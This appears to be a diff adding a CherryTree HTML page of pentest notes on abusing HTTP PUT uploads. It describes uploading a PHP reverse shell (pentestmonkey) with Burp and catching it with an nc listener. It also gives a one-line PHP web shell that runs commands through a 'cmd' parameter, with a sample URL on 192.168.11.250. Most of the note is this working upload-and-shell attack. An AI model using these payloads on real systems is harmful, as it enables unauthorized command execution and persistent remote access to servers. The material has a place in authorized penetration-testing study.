@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>PUT</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>PUT</h1><br/>If you can put a file in a dir crack open BURP!<br /><br />PUT /ExampleDirThatICanPutTo/myfile.php<br />^firstline<br /><br />in the load section put the php pentestmonkey script<br /><br />start nc listener<br />http://192.168.11.250/ExampleDirThatICanPutTo/myfile.php<br /><br /><br /><br />_---------------------------------------------______________________--------------VVVThis is For a webshellVVV<br />PUT /ExampleDirThatICanPutTo/myfile.php<br />^firstline<br /><br />&lt;?php<br />Echo exec($_GET[cmd]);<br />?&gt;<br />^In the load section<br /><br /><br />http://192.168.11.250/ExampleDirThatICanPutTo/myfile.php?cmd=whoami</div></body></html>
